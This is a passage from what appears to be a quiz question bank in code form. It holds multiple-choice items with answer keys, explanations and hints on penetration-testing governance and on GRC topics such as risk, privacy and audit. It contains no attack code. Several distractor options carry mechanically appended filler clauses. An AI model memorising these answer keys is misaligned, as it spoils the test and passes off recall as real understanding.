    options: ["Show the risk reduction and the cost of the incidents prevented","Threaten to resign if the budget is cut at all","State that testing is always required without explanation","Offer to run the same tests with fewer people and no review, and revisit the decision after the next release"],
    correct: 0, why: "Stating requirement alone is the runner-up as it is simple, but it gives no evidence of value for the CFO to weigh.",
    hint: "Value evidence."
  },
  {
    id: 461, rank: 4, role: "pentest", topic: "Legal Privilege Handling", difficulty: "EXPERT",
    q: "Why might a client route a test through legal counsel in some situations?",
    options: ["To avoid ever fixing them","To protect the confidentiality of sensitive findings where the law allows","To cut the report cost","To delay the start date"],
    correct: 1, why: "Privilege may protect sensitive analysis from disclosure.",
    hint: "Confidentiality."
  },
  {
    id: 462, rank: 4, role: "pentest", topic: "Exposure Management", difficulty: "EXPERT",
    q: "What does continuous exposure management add beyond periodic testing?",
    options: ["A replacement for the incident response team that handles real attacks every day","A way to avoid asset inventories","A live view of assets, weaknesses and attack paths","A promise that no weakness will ever exist again once the platform is installed"],
    correct: 2, why: "It combines discovery, prioritisation and validation continuously.",
    hint: "Live view."
  },
  {
    id: 463, rank: 4, role: "pentest", topic: "Control Failure Exhibit", difficulty: "EXPERT",
    exhibit: "Privileged access requests (last 90 days): 112 approved\nAccess granted with expiry: 0\nAccounts with admin rights older than 180 days: 74\nReview of standing access: not performed",
    q: "What does this control assessment show about the privileged access process?",
    options: ["Access is removed automatically after each approved task","No privileged access exists in the company","All approvals are denied by default","Approvals exist but standing access is never removed"],
    correct: 3, why: "Standing privilege defeats the purpose of approvals.",
    hint: "Look at expiry."
  },
  {
    id: 464, rank: 4, role: "pentest", topic: "Third-Party Assurance", difficulty: "EXPERT",
    q: "How should a company gain assurance on a critical supplier's security?",
    options: ["Contractual testing rights, evidence review and joint remediation","Trust the supplier's marketing brochure completely, wherever possible","Ask the supplier whether they feel secure, where that is practical","Check only that the invoice is paid on time"],
    correct: 0, why: "Evidence and contractual rights give confidence.",
    hint: "Evidence and rights."
  },
  {
    id: 465, rank: 4, role: "pentest", topic: "Maturity Roadmap Exhibit", difficulty: "EXPERT",
    exhibit: "Year 1: 3 tests, 142 findings   Year 2: 4 tests, 151 findings (62% repeat)\nMean time to detect: 9 days   Mean time to contain: 14 days\nDetection rules added after tests: 3\nIncident response exercises: 0",
    q: "Which next step does this roadmap summary suggest is the highest priority?",
    options: ["Replace the incident response team, and review the outcome at the next monthly meeting","Improve detection, and response before adding further offensive tests","Stop testing until the next financial year","Run more tests to find more of the same issues, then record the result in the ticket"],
    correct: 1, why: "Repeated tests that find the same issues add little until detection is improved.",
    hint: "Same issues again."
  },
  {
    id: 466, rank: 4, role: "pentest", topic: "Strategic Metrics", difficulty: "EXPERT",
    q: "Which metric best shows security testing is improving organisational resilience?",
    options: ["Rising number of tests purchased, and review the outcome at the next monthly meeting","More slides in the board pack","Declining time to detect, and contain simulated attacks","More pages in each report"],
    correct: 2, why: "Resilience shows in faster detection and containment.",
    hint: "Speed of response."
  },
  {
    id: 467, rank: 4, role: "pentest", topic: "Emergent Technology Testing", difficulty: "EXPERT",
    q: "How should testing approach a new technology such as an AI-enabled service?",
    options: ["Use the same checklist without any adaptation","Adapt the methodology to the new risks and involve specialists","Avoid testing it until it is old","Ask the vendor to approve every finding first, and revisit the decision after the next release"],
    correct: 1, why: "New technology brings new risks that need suitable methods.",
    hint: "Adapt."
  },
  {
    id: 468, rank: 4, role: "pentest", topic: "Offensive Security Ethics", difficulty: "EXPERT",
    q: "Which principle best guides ethical conduct in security testing?",
    options: ["Do anything that is possible if it helps the client","Keep any discovered flaws for personal use, until the next scheduled review takes place","Act only within authorisation and protect the client and the public","Share client data with the community, until the next scheduled review takes place"],
    correct: 2, why: "Ethics rest on authorisation, confidentiality and minimising harm.",
    hint: "Authorisation."
  },
  {
    id: 469, rank: 4, role: "pentest", topic: "Incident Lessons Exhibit", difficulty: "EXPERT",
    exhibit: "Timeline: attacker used the remote management tool from day 1\nAlerts: 0 (tool is allow-listed and logs not forwarded)\nDwell time: 23 days\nAction items: forward management tool logs; build detection for out-of-hours use",
    q: "What does this post-incident review suggest was missing before the incident?",
    options: ["A tested detection for abuse of an admin tool","A new office building for the security team to use for their weekly planning meetings","More staff in the marketing team to write about the security programme to customers","A faster internet connection for the analysts who watch the alerts around the clock"],
    correct: 0, why: "The abuse of trusted tools went unnoticed because no detection existed.",
    hint: "What went unseen?"
  },
  {
    id: 470, rank: 4, role: "pentest", topic: "Findings Backlog Management", difficulty: "EXPERT",
    q: "A large backlog of old findings has built up. What is the BEST way to reduce it?",
    options: ["Add every finding to the next budget bid, and revisit the decision after the next release","Prioritise by risk and fix root causes with agreed owners and dates","Close all of the oldest findings automatically, where that is practical","Hide the backlog from the board"],
    correct: 1, why: "Closing the oldest is the runner-up as it clears the list quickly, but old findings can still be the most dangerous.",
    hint: "Risk and root cause."
  },
  {
    id: 471, rank: 4, role: "pentest", topic: "Board Reporting", difficulty: "EXPERT",
    q: "What should a board report on testing emphasise?",
    options: ["Only the positive results","Trends, key risks, decisions needed and progress against targets, as a general rule","The brand names of tools","Every technical detail"],
    correct: 1, why: "Boards need decision-ready information.",
    hint: "Decisions."
  },
  {
    id: 472, rank: 4, role: "pentest", topic: "Deception Technology", difficulty: "EXPERT",
    q: "How can deception assets such as decoy accounts help defenders?",
    options: ["They speed up the production network as decoys take load away from servers","They remove the need for patching as the decoys confuse every attacker well","They replace all of the other monitoring tools that the security team has today","They give high-confidence alerts when touched"],
    correct: 3, why: "Decoys have no legitimate use so any touch is suspicious.",
    hint: "High-confidence alerts."
  },
  {
    id: 473, rank: 4, role: "pentest", topic: "Detection Validation Exhibit", difficulty: "EXPERT",
    exhibit: "Rule: suspicious service creation    Status: enabled\nSimulated events: 12   Alerts fired: 0\nLog source: Windows System log (hosts: 0 of 400 forwarding event 7045)\nLast data received: 41 days ago",
    q: "What is the best interpretation of this validation run?",
    options: ["Rules exist but the data source is missing so alerts cannot fire","The rules fired correctly on every simulated event, in most cases","The rules were deleted before the run","The simulation was never run"],
    correct: 0, why: "A missing log source silently breaks a detection.",
    hint: "Telemetry missing."
  },
  {
    id: 474, rank: 4, role: "pentest", topic: "Metrics for Detection Quality", difficulty: "EXPERT",
    q: "Which measure best shows quality of a detection rule?",
    options: ["The words in the rule description","The age of the rule","The name of the engineer","True positives against false positives and coverage of the technique"],
    correct: 3, why: "Precision and coverage reflect rule value.",
    hint: "Precision."
  },
  {
    id: 475, rank: 4, role: "pentest", topic: "Crisis Communication", difficulty: "EXPERT",
    q: "In a major incident found during a test, who should be informed first?",
    options: ["The competitors","The designated incident lead and the client contact in the agreed channel","The public on social media","All suppliers at once"],
    correct: 1, why: "Use the agreed escalation path.",
    hint: "Agreed path."
  },
  {
    id: 476, rank: 4, role: "pentest", topic: "Cost of Over-Testing", difficulty: "EXPERT",
    q: "What is the main risk of running too many overlapping tests?",
    options: ["Not enough findings being reported to keep the remediation teams busy in the year","Too few security tools being available to the team to run all of the planned tests","Too little interest from attackers as the testing makes the company less visible","Alert fatigue and fix capacity used on duplicate findings"],
    correct: 3, why: "Duplicate effort wastes scarce remediation capacity.",
    hint: "Capacity."
  },
  {
    id: 477, rank: 4, role: "pentest", topic: "Open Source Dependencies", difficulty: "EXPERT",
    q: "What is the best programme-level response to a widespread library flaw?",
    options: ["Ask developers to guess where it is used","Use an inventory to find all uses and coordinate fixes and checks","Remove the library name from documents, and review the outcome at the next monthly meeting","Wait until the vendor contacts each team, then record the result in the ticket"],
    correct: 1, why: "An inventory lets the organisation respond quickly.",
    hint: "Inventory."
  },
  {
    id: 478, rank: 4, role: "pentest", topic: "Ransomware Readiness Exhibit", difficulty: "EXPERT",
    exhibit: "Domain admin logons on workstations (30 days): 212\nBackup server joined to domain, same admin group\nOffline backup copy: none\nEDR coverage servers: 91%   Last full restore test: never",
    q: "Which gap in this readiness review most increases ransomware impact?",
    options: ["EDR covers all servers","Domain admin credentials are used on user workstations and backups share them","Admin logons use jump hosts","Backups are offline, and tested"],
    correct: 1, why: "Shared credentials let one compromise reach backups and servers.",
    hint: "Credential reuse."
  },
  {
    id: 479, rank: 4, role: "pentest", topic: "Metrics Gaming Risk", difficulty: "EXPERT",
    q: "Why can targets such as 'close 90 percent of findings' be gamed?",
    options: ["They encourage honest reporting only as nobody would ever try to change the figures","They always improve the real risk as teams work hard to meet every set target","Teams can close easy items while serious ones stay open","They cannot be gamed in any way as the numbers are collected by an automatic system"],
    correct: 2, why: "Poorly designed metrics reward the wrong behaviour.",
    hint: "Perverse incentive."
  },
  {
    id: 480, rank: 4, role: "pentest", topic: "Knowledge Management", difficulty: "EXPERT",
    q: "How can a test team preserve lessons from past engagements?",
    options: ["Rely on memory alone","Keep sanitised lessons and patterns in a shared knowledge base","Keep notes on personal laptops only","Delete notes after each project"],
    correct: 1, why: "Sanitised shared knowledge improves future work.",
    hint: "Sanitised sharing."
  },
  {
    id: 481, rank: 4, role: "pentest", topic: "Tabletop Design", difficulty: "EXPERT",
    q: "What makes a tabletop exercise valuable for leaders?",
    options: ["Only technical staff taking part, and the leaders are not asked to make decisions","A long slide deck from the facilitator that explains each stage in full detail first","Realistic decisions and recorded follow-up actions","No notes being taken, and people feel free to speak without worrying about records"],
    correct: 2, why: "Decisions and actions drive improvement.",
    hint: "Decisions and actions."
  },
  {
    id: 482, rank: 4, role: "pentest", topic: "Attack Path Management", difficulty: "EXPERT",
    q: "How does attack path management help prioritise fixes?",
    options: ["It ignores the value of the assets, and treats every weakness as the same risk to all","It replaces patching entirely","It finds the few weaknesses that link to critical assets","It lists every weakness equally and leaves the teams to work out which one to fix first"],
    correct: 2, why: "Fixing choke points reduces many paths at once.",
    hint: "Choke points."
  },
  {
    id: 483, rank: 4, role: "pentest", topic: "Regulatory Alignment", difficulty: "EXPERT",
    q: "How can a testing programme support financial regulation on operational resilience?",
    options: ["By avoiding testing of the critical services and nothing can go wrong for the firm","Evidence of testing against important business services","By reporting results only to the testers, and no one else has to read the long report","By testing only systems that hold no data and no regulator can ask about the results"],
    correct: 1, why: "Regulations focus on resilience of important services.",
    hint: "Important services."
  },
  {
    id: 484, rank: 4, role: "pentest", topic: "Retention of Test Evidence", difficulty: "EXPERT",
    q: "How long should detailed test evidence be retained?",
    options: ["Until the next lunch","Forever on removable media","Until the testers leave","Only as long as the contract, and law require then be securely destroyed, as a general rule"],
    correct: 3, why: "Retain minimally and dispose securely.",
    hint: "Minimal retention."
  },
  {
    id: 485, rank: 4, role: "pentest", topic: "Cloud Exposure Review Exhibit", difficulty: "EXPERT",
    exhibit: "Public shares found: 17\nWith documented owner: 2\nWith business justification: 1\nLast review date: none\nContains personal data: 6 shares",
    q: "What does this review of exposed storage show about governance?",
    options: ["Owners approve every share, and the approvals are recorded in the ticketing system for audit","No owner or review exists for public data shares","Public shares are blocked by policy and exceptions need a signed approval from the CISO","All shares are reviewed every quarter, and each one has a business justification on file"],
    correct: 1, why: "Unowned public shares point to missing governance.",
    hint: "Owner?"
  },
  {
    id: 486, rank: 4, role: "pentest", topic: "Talent and Skills", difficulty: "EXPERT",
    q: "What is a sound way to build capability in a testing function?",
    options: ["Prevent them sharing knowledge, where that is practical","Hire one person and leave them alone, as a first step","Mix of training, mentoring, peer review and rotation","Avoid training to save money"],
    correct: 2, why: "Capability grows through practice and review.",
    hint: "Mentoring and review."
  },
  {
    id: 487, rank: 4, role: "pentest", topic: "Aligning with Frameworks", difficulty: "EXPERT",
    q: "Why map testing results to a recognised control framework?",
    options: ["To show coverage and gaps in a common language","To hide the weaknesses that were found behind a long list of numbered control codes","To reduce the scope of the next test until only the easy controls are left to check","To avoid having to report any of the results to the people who own the systems"],
    correct: 0, why: "Frameworks give a common structure for assurance.",
    hint: "Common language."
  },
  {
    id: 488, rank: 4, role: "pentest", topic: "Quantum Readiness Review", difficulty: "EXPERT",
    q: "How should an organisation prepare for future cryptographic change?",
    options: ["Ignore the topic, then record the result in the ticket","Wait until all algorithms are broken","Remove all encryption, then record the result in the ticket","Inventory cryptography and plan for agile replacement"],
    correct: 3, why: "An inventory and agility enable timely migration.",
    hint: "Inventory crypto."
  },
  {
    id: 489, rank: 4, role: "pentest", topic: "Purple Team Metrics Exhibit", difficulty: "EXPERT",
    exhibit: "Quarter  Techniques covered  True-positive rate\nQ1       18                  71%\nQ2       27                  58%\nQ3       34                  44%\nQ4       41                  39%",
    q: "What does this quarterly purple team trend suggest?",
    options: ["Coverage grows but alert quality falls and needs tuning, as a general rule","Coverage, and quality are both rising steadily in each of the four quarters","Nothing changed in any quarter","Coverage is falling while quality is rising in every one of the four quarters"],
    correct: 0, why: "More rules raised false positives, so tuning is the next step.",
    hint: "Two trends."
  },
  {
    id: 490, rank: 4, role: "pentest", topic: "Control Ownership Model", difficulty: "EXPERT",
    q: "Who should own the remediation of a finding about a business application's access controls?",
    options: ["The tester who found the issue, and who wrote the report for the client team","The external auditor who reviews the controls for the annual compliance exercise","The vendor of the testing tool that detected the weakness in the application","The application owner with security and engineering, in most cases"],
    correct: 3, why: "Risk and fixes belong to the owner of the asset.",
    hint: "Asset owner."
  },
  {
    id: 491, rank: 4, role: "pentest", topic: "Strategic Test Portfolio", difficulty: "EXPERT",
    q: "A board wants to know where testing should focus over three years. What is the BEST approach?",
    options: ["An identical annual test of every system","One large test in the final year","A plan driven by the vendors' marketing","A risk-led roadmap linked to critical services and change plans"],
    correct: 3, why: "Identical annual tests are the runner-up as they are consistent, but they ignore changing risk and priorities.",
    hint: "Risk-led roadmap."
  },
  {
    id: 492, rank: 4, role: "pentest", topic: "Residual Exposure Exhibit", difficulty: "EXPERT",
    exhibit: "Critical findings: 21 found, 19 fixed, 2 accepted (owner CIO, expires 2026-03-31)\nHigh findings: 66 found, 60 fixed, 6 in progress\nRetest pass rate: 91%",
    q: "What does this summary tell leaders about residual exposure?",
    options: ["The number of tests is the only useful measure","No risks were identified in the period","Most critical issues are fixed but two accepted risks remain open","All risks are closed and need no further attention"],
    correct: 2, why: "Remaining accepted items must stay visible with owners.",
    hint: "Open items."
  },
  {
    id: 493, rank: 4, role: "pentest", topic: "Independence of Assurance", difficulty: "EXPERT",
    q: "Why is independence important for an assurance function?",
    options: ["It reduces pressure to soften findings","It removes the need for evidence","It makes the reports shorter","It allows the function to avoid reporting"],
    correct: 0, why: "Independence supports honest reporting.",
    hint: "Honest findings."
  },
  {
    id: 494, rank: 4, role: "pentest", topic: "Metrics for Security Debt", difficulty: "EXPERT",
    q: "Which measure best shows growth of security debt?",
    options: ["Count and age of overdue high-risk findings","The number of dashboards available","The size of the annual testing budget","The number of employees in the security team"],
    correct: 0, why: "Overdue risk shows delays that build exposure.",
    hint: "Overdue and age."
  },
  {
    id: 495, rank: 4, role: "pentest", topic: "Joint Exercise Design", difficulty: "EXPERT",
    q: "What is the best purpose of a joint exercise between testers and defenders?",
    options: ["To avoid writing a report","To prove the defenders are inadequate","To improve detection, and response with shared learning, as a general rule","To keep the findings from management"],
    correct: 2, why: "Collaboration converts simulation into lasting improvement.",
    hint: "Shared learning."
  },
  {
    id: 496, rank: 4, role: "pentest", topic: "Regulator Questions", difficulty: "EXPERT",
    q: "A regulator asks how the firm tests its resilience. What is the best answer?",
    options: ["Provide the full technical details of every weakness, and review the outcome at the next monthly meeting","Describe the programme scope frequency results and remediation","Say that testing is confidential, and nothing can be shared","Promise that no weaknesses exist"],
    correct: 1, why: "Regulators want to see governance and evidence of improvement.",
    hint: "Programme not details."
  },
  {
    id: 497, rank: 4, role: "pentest", topic: "Control Drift Exhibit", difficulty: "EXPERT",
    exhibit: "Finding: weak session timeout\n2025-03 test: found  2025-05 retest: fixed (timeout 15 min)\n2025-09 test: found again (timeout 24 h)\nRelease 4.2 notes: 'restored legacy session settings for a customer'",
    q: "Which conclusion does this retest comparison support?",
    options: ["Fixes have regressed because a later release reverted them","The fixes were never applied to any system","The original findings were false","The retest was not carried out properly"],
    correct: 0, why: "Findings reappearing after release show weak change control.",
    hint: "Fixed then back."
  },
  {
    id: 498, rank: 4, role: "pentest", topic: "Offensive Capability Governance", difficulty: "EXPERT",
    q: "Which control best governs an internal offensive security team?",
    options: ["Unlimited access to all systems","No records to protect secrecy","Written authorisation oversight, and logging of all activity, in most cases","Verbal permission from any manager"],
    correct: 2, why: "Strong governance keeps offensive work safe and lawful.",
    hint: "Authorise and log."
  },
  {
    id: 499, rank: 4, role: "pentest", topic: "Scenario Selection", difficulty: "EXPERT",
    q: "How should leaders choose scenarios for a resilience exercise?",
    options: ["By picking the scenario that is easiest to run","By choosing one that nobody is worried about","By likely impact on critical services and recent threats","By copying one from another industry exactly, in most cases"],
    correct: 2, why: "Scenarios should test what matters most.",
    hint: "Critical services."
  },
  {
    id: 500, rank: 4, role: "pentest", topic: "Reporting Culture", difficulty: "EXPERT",
    q: "How should leaders respond when testing finds serious failings in a team?",
    options: ["Publicly criticise the team members, as a general rule","Stop all future testing, and review the outcome at the next monthly meeting","Remove the finding from the report","Focus on fixing causes and supporting the team"],
    correct: 3, why: "A blame-free approach encourages openness.",
    hint: "Fix causes."
  },
  {
    id: 501, rank: 0, role: "grc", topic: "Standards and Procedures", difficulty: "BEGINNER",
    q: "How do standards and procedures relate to a security policy?",
    options: ["They are written by the vendor, and replace the policy completely","They describe the products that the company bought last year","They give the detailed steps and requirements for it","They are only needed by the auditors, and never by the staff on duty"],
    correct: 2, why: "Policies state intent, standards set requirements and procedures give the steps.",
    hint: "Detail under intent."
  },
  {
    id: 502, rank: 0, role: "grc", topic: "Risk Definition", difficulty: "BEGINNER",
    q: "Which statement best defines risk?",
    options: ["The chance of a threat exploiting a weakness, and its impact, in most cases","Any security tool that has stopped working during the working week for a few hours","A weakness found by a scanner on any system in the company","The number of staff who work in the security team"],
    correct: 0, why: "Risk combines how likely something is with how bad the consequences would be.",
    hint: "Likelihood and impact."
  },
  {
    id: 503, rank: 0, role: "grc", topic: "Risk Tolerance Statement", difficulty: "BEGINNER",
    q: "What does risk tolerance describe in a risk framework?",
    options: ["How far results may stray from the stated appetite","The premium paid to the insurer for the year that has just ended","The amount of risk that a company has already removed completely","The total number of risks recorded as the company was founded"],
    correct: 0, why: "Tolerance sets the acceptable variation around the risk appetite that leaders have agreed.",
    hint: "Allowed variation."
  },
  {
    id: 504, rank: 0, role: "grc", topic: "Risk Treatment Options", difficulty: "BEGINNER",
    q: "A business decides to stop an activity because its risk is too high. Which treatment is this?",
    options: ["Mitigation by adding a further control","Acceptance of the risk after approval","Transfer of the risk through an insurance policy","Avoidance"],
    correct: 3, why: "Avoiding a risk means not doing the activity that creates it.",
    hint: "Stop doing it."
  },
  {
    id: 505, rank: 0, role: "grc", topic: "Data Classification Purpose", difficulty: "BEGINNER",
    q: "Why do organisations classify data as public, internal or confidential?",
    options: ["To decide which colour of folder the paper copies should be filed in","To reduce the total amount of data that the company stores each year","To apply handling controls that match how sensitive the data is","To rank employees by how many files they are allowed to open"],
    correct: 2, why: "Classification drives access, storage, sharing and disposal rules.",
    hint: "Handling by sensitivity."
  },
  {
    id: 506, rank: 0, role: "grc", topic: "GDPR Data Subject Right", difficulty: "BEGINNER",
    q: "Which of these is a right of an individual under GDPR?",
    options: ["Asking to access the personal data held about them","Receiving a refund of any fee paid to the company, as a first step","Choosing which security controls the company must buy","Reading the company's confidential business plans, until the next scheduled review takes place"],
    correct: 0, why: "Data subjects can request access, correction and in some cases erasure of their personal data.",
    hint: "Access to own data."
  },
  {
    id: 507, rank: 0, role: "grc", topic: "ISO 27001 Meaning", difficulty: "BEGINNER",
    q: "What does ISO 27001 specify?",
    options: ["Requirements for an information security management system, in most cases","A list of passwords that are banned in every country, and every industry sector","The exact firewall brand that every certified company must install on its network","The price that auditors may charge for reviewing a company's security controls each year"],
    correct: 0, why: "It sets management system requirements, and organisations can be certified against it.",
    hint: "Management system."
  },
  {
    id: 508, rank: 0, role: "grc", topic: "SOC 2 Report", difficulty: "BEGINNER",
    q: "What is a SOC 2 report mainly used for?",
    options: ["Replacing the need for a company to have any written security policies at all","Listing the passwords of the provider's administrators for the customer's auditors","Giving customers assurance about a service provider's controls","Proving that a company has never suffered a security incident in its whole history"],
    correct: 2, why: "An independent auditor reports on controls relevant to security and related criteria.",
    hint: "Assurance for customers."
  },
  {
    id: 509, rank: 0, role: "grc", topic: "Audit Evidence", difficulty: "BEGINNER",
    q: "An auditor asks how you know access reviews were completed. What should you provide?",
    options: ["The password policy document alone, with no records of the reviews","Dated records showing who reviewed what and the outcome","A statement from a manager that they usually do it","A promise to complete the reviews before the next audit, in most cases"],
    correct: 1, why: "Evidence must show the control operated, with dates, owners and results.",
    hint: "Show records."
  },
  {
    id: 510, rank: 0, role: "grc", topic: "Third-Party Risk", difficulty: "BEGINNER",
    q: "A company wants to use a new cloud supplier that will hold customer data. What is the BEST first step?",
    options: ["Send the data now and review the supplier next year, and review the outcome at the next monthly meeting","Sign the contract first, and ask about security after launch","Rely on the supplier's website claims alone, and review the outcome at the next monthly meeting","Assess the supplier's security and agree contract terms before sharing data"],
    correct: 3, why: "Relying on the website is the runner-up as it is quick, but it is not evidence; assessment and contract controls come before data sharing.",
    hint: "Assess before sharing."
  },
  {
    id: 511, rank: 0, role: "grc", topic: "Business Continuity Meaning", difficulty: "BEGINNER",
    q: "What is the goal of business continuity planning?",
    options: ["Reducing the number of employees in the organisation, then record the result in the ticket","Keeping critical services running or restoring them quickly after a disruption","Preventing every possible attack on the organisation's network, as a first step","Moving all data into the cloud as quickly as possible"],
    correct: 1, why: "BCP prepares the organisation to continue essential operations during disruption.",
    hint: "Keep operating."
  },
  {
    id: 512, rank: 0, role: "grc", topic: "RTO and RPO", difficulty: "BEGINNER",
    q: "What does a recovery point objective (RPO) describe?",
    options: ["How many staff are needed for recovery","How long a system may take to be restored after an outage has started","How much money the recovery will cost","How much data loss is acceptable, measured in time"],
    correct: 3, why: "RPO is the maximum age of data that can be lost; RTO is the time allowed to restore service.",
    hint: "Data loss window."
  },
  {
    id: 513, rank: 0, role: "grc", topic: "Separation of Duties", difficulty: "BEGINNER",
    q: "Why should the person who requests a payment not be the one who approves it?",
    options: ["It means staff do not trust anyone","Two people reduce the chance of error or fraud, as a general rule","It makes the process slower on purpose to discourage staff from requesting payments","It is required by every browser"],
    correct: 1, why: "Separating duties means one person cannot complete a sensitive action alone.",
    hint: "Two sets of eyes."
  },
  {
    id: 514, rank: 0, role: "grc", topic: "Policy Review Cycle", difficulty: "BEGINNER",
    q: "How often should security policies normally be reviewed?",
    options: ["Every day","Only when an auditor asks","At planned intervals, and after major changes, in most cases","Never, once they have been approved by the board in the first year"],
    correct: 2, why: "Regular and event-driven review keeps policies accurate and relevant.",
    hint: "Planned and triggered."
  },
  {
    id: 515, rank: 0, role: "grc", topic: "Confidential Paper Disposal", difficulty: "BEGINNER",
    q: "What should happen to printed confidential papers that are no longer needed?",
    options: ["Be shredded or placed in a locked confidential disposal bin","Be kept on the desk until the end of the month, in most cases","Be left on the printer, and others can reuse them","Be thrown into the normal waste bin by the desk, in most cases"],
    correct: 0, why: "Confidential papers must be destroyed securely so that nobody can recover the information.",
    hint: "Destroy securely."
  },
  {
    id: 516, rank: 0, role: "grc", topic: "Risk Register Entry", difficulty: "BEGINNER",
    exhibit: "ID: R-014 | Risk: Supplier holds unencrypted customer data | Likelihood: 3 | Impact: 4 | Owner: (blank) | Treatment: (blank)",
    q: "Which item is essential in a risk register entry?",
    options: ["The number of pages in the policy, as a general rule","The colour of the report cover, as a general rule","The date the auditor was born","A named risk owner and a treatment decision"],
    correct: 3, why: "Ownership and decisions make risks manageable and trackable.",
    hint: "Owner and decision."
  },
  {
    id: 517, rank: 0, role: "grc", topic: "Control Types", difficulty: "BEGINNER",
    q: "A security camera at the entrance that records visitors is which type of control?",
    options: ["Preventive, as it stops everyone entering","Compensating, as it replaces a missing policy","Detective","Corrective, as it repairs the damage after an incident"],
    correct: 2, why: "Cameras record and help find incidents after the event; they do not themselves stop entry.",
    hint: "Records afterwards."
  },
  {
    id: 518, rank: 0, role: "grc", topic: "Asset Inventory Value", difficulty: "BEGINNER",
    q: "Why is an up-to-date asset inventory important for security governance?",
    options: ["It reduces the number of laptops","It makes the office look tidy","It replaces the need for taking regular backups of the production systems","You cannot protect or assess what you do not know you have"],
    correct: 3, why: "Inventory underpins risk assessment, patching and incident response.",
    hint: "Know your assets."
  },
  {
    id: 519, rank: 0, role: "grc", topic: "Security Awareness Training", difficulty: "BEGINNER",
    q: "Staff keep falling for simple phishing emails. What is the BEST improvement to the awareness programme?",
    options: ["One long annual training with no follow-up, as a general rule","Punishing every employee who clicks, where that is practical","Short, regular, role-relevant training with easy reporting","Removing all email from the company, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Punishment is the runner-up since it signals seriousness, but it discourages reporting; regular practical training works better.",
    hint: "Regular and relevant."
  },
  {
    id: 520, rank: 0, role: "grc", topic: "Incident Reporting Duty", difficulty: "BEGINNER",
    q: "A staff member sees a lost laptop that holds personal data. What should the policy say?",
    options: ["Mention it at the next annual meeting","Report it immediately through the defined incident channel","Tell a friend first, until the next scheduled review takes place","Wait to see whether it turns up, until the next scheduled review takes place"],
    correct: 1, why: "Prompt reporting lets the organisation assess impact and meet legal deadlines.",
    hint: "Report at once."
  },
  {
    id: 521, rank: 0, role: "grc", topic: "Compliance Versus Security", difficulty: "BEGINNER",
    q: "Which statement about compliance and security is most accurate?",
    options: ["Compliance guarantees that no breach will ever happen once the audit has been passed","Compliance sets a minimum and security needs ongoing risk management","They are always exactly the same thing","Security is only needed when an audit is due"],
    correct: 1, why: "Meeting a standard does not replace managing real risks.",
    hint: "Minimum, not guarantee."
  },
  {
    id: 522, rank: 0, role: "grc", topic: "Data Retention", difficulty: "BEGINNER",
    q: "Why should personal data be deleted once there is no longer a reason to keep it?",
    options: ["Deleting data always makes every system faster, and cheaper to run in the company","Keeping it longer raises risk and may break privacy rules","Auditors prefer empty systems","It saves paper"],
    correct: 1, why: "Storage limitation reduces exposure and supports privacy obligations.",
    hint: "Do not keep forever."
  },
  {
    id: 523, rank: 0, role: "grc", topic: "Joiner Mover Leaver", difficulty: "BEGINNER",
    q: "What should happen to a leaver's system access?",
    options: ["It is left for IT to notice","It is shared with their team","It is removed promptly on or before their last day","It stays active for a year as a courtesy"],
    correct: 2, why: "Timely removal prevents misuse of dormant accounts.",
    hint: "Remove promptly."
  },
  {
    id: 524, rank: 0, role: "grc", topic: "Vendor Questionnaire Review", difficulty: "BEGINNER",
    exhibit: "Q7 Do you encrypt customer data at rest? Yes\nQ8 Do you test backups? Yes\nQ9 Do you have an incident plan? Yes\nEvidence attached: none",
    q: "A supplier answers 'yes' to every question on a security questionnaire without any evidence. What should the assessor do?",
    options: ["Assume the supplier is lying","Accept the answers as true, and file the questionnaire away with the contract documents","Reject all suppliers","Ask for supporting evidence and follow up on key controls, where that is practical"],
    correct: 3, why: "Self-declared answers need verification proportionate to the risk.",
    hint: "Ask for proof."
  },
  {
    id: 525, rank: 0, role: "grc", topic: "Risk Appetite", difficulty: "BEGINNER",
    q: "What does risk appetite describe?",
    options: ["The number of risks in a register","The price of insurance","The hunger of the security team","The amount and type of risk an organisation is willing to accept"],
    correct: 3, why: "Appetite guides decisions on when to accept, treat or avoid risk.",
    hint: "Willingness to accept."
  },
  {
    id: 526, rank: 0, role: "grc", topic: "Change Management", difficulty: "BEGINNER",
    q: "Why do organisations use a change management process for production systems?",
    options: ["To replace testing","To assess, approve and record changes so that problems can be traced","To give developers extra work each week","To stop all changes from ever happening in the company, in most cases"],
    correct: 1, why: "Controlled changes reduce outages and security gaps and provide an audit trail.",
    hint: "Control the change."
  },
  {
    id: 527, rank: 0, role: "grc", topic: "BYOD Policy", difficulty: "BEGINNER",
    q: "What should a bring-your-own-device policy require?",
    options: ["That company data is stored on personal clouds","Nothing as employees own the device","Minimum security settings, and the ability to remove company data, in most cases","That devices have no passwords"],
    correct: 2, why: "Personal devices still need controls to protect company information.",
    hint: "Protect company data."
  },
  {
    id: 528, rank: 0, role: "grc", topic: "Policy Exception Handling", difficulty: "BEGINNER",
    q: "A manager asks to skip a security control for a project deadline. What is the BEST response?",
    options: ["Record a time-limited exception with an owner and compensating controls","Ignore the request","Approve it verbally, and move on","Refuse any exception under every circumstance, until the next scheduled review takes place"],
    correct: 0, why: "Refusing everything is the runner-up as it is strict, but it pushes people to bypass the process; managed exceptions keep risk visible.",
    hint: "Formal and temporary."
  },
  {
    id: 529, rank: 0, role: "grc", topic: "Key Risk Indicator", difficulty: "BEGINNER",
    q: "Which item is the best example of a key risk indicator (KRI)?",
    options: ["The number of staff photos taken","The colour of the dashboard","The number of critical vulnerabilities open beyond their deadline","The number of meetings held"],
    correct: 2, why: "KRIs show whether risk exposure is rising or falling against thresholds.",
    hint: "Early warning measure."
  },
  {
    id: 530, rank: 0, role: "grc", topic: "Privacy Notice", difficulty: "BEGINNER",
    q: "What should a privacy notice explain to individuals?",
    options: ["The security passwords of the organisation","What personal data is collected, why, and how it is used","The salaries of the executives","The architecture of the network"],
    correct: 1, why: "Transparency is a core privacy principle.",
    hint: "Tell people."
  },
  {
    id: 531, rank: 0, role: "grc", topic: "DPIA Trigger", difficulty: "BEGINNER",
    q: "When is a data protection impact assessment most likely to be needed?",
    options: ["Before a new system that processes sensitive data at large scale","When changing the office furniture","When hiring a cleaner","When printing a leaflet"],
    correct: 0, why: "A DPIA assesses privacy risk before high-risk processing starts.",
    hint: "High-risk processing."
  },
  {
    id: 532, rank: 0, role: "grc", topic: "PCI DSS Scope", difficulty: "BEGINNER",
    q: "What does PCI DSS apply to?",
    options: ["Only banks' head offices","Only government agencies","Every website in the world","Organisations that store, process or transmit payment card data, as a general rule"],
    correct: 3, why: "It is the industry standard for protecting cardholder data.",
    hint: "Card data."
  },
  {
